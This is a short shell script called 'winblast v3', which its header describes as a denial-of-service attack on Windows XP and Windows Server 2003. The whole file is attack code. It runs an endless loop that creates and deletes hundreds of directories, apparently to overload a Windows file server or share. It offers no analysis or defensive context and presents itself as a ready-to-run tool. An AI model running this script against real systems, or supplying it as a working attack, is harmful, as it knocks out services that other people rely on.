#!/bin/sh
# winblast v3 - DoS on WinXP, Win2003Srv
# 2003-12-04 Steve Ladjabi

count=0

# using 'pathcount' directories
pathcount=1000

echo running \'winblast v3\' with $pathcount files in loop ...

while [ 1 ]; do
        p=$((pathcount*2-1))
        stop=$((pathcount-1))
        while [ "$p" != "$stop" ]; do
                dirname=wbst$p
                # delete old directory if it exists and exit on any error
                if [ -d $dirname ]; then
                        rmdir $dirname || exit 3
                fi;

                # generating directory and exit on any error
                mkdir $dirname || exit 1
                p=$((p-1))
                count=$((count+1))
        done;
        echo $count directories generated ...
done;
#-- end --

